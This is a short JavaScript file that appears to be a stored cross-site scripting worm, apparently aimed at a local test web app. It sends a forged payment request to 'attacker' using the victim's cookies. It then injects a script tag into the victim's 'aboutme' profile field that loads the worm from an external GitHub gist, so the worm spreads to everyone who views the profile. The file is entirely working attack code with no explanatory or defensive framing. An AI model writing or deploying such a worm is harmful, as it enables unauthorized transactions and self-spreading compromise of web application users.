var xhr = new XMLHttpRequest();
xhr.open('POST', 'http://localhost:8080/pay', true);
xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
xhr.setRequestHeader("Cookie", document.cookie);
xhr.send('recipient=attacker&amount=1');
var infection_code = "<script type=\"text\/javascript\" src=\"https:\/\/gist.githubusercontent.com\/mrajesh26\/fa228e7ff2b83b78d70f5d7b72dbb742\/raw\/f1ac2cbd32b8dfc7e1c4babc8710c32aebb3a54d\/xss_worm.js\"> <\/script>";
spread_worm();
function spread_worm() {
    try {
        var xhr = new XMLHttpRequest();
        var params = "aboutme="+encodeURIComponent(infection_code);
        xhr.open("POST", "http:\/\/localhost:8080\/aboutme", true);
        xhr.setRequestHeader("Content-Type", "application\/x-www-form-urlencoded");
        xhr.setRequestHeader("Cookie", document.cookie);
        xhr.send(params);
    } catch (err) {
      console.error(err);
    }
}
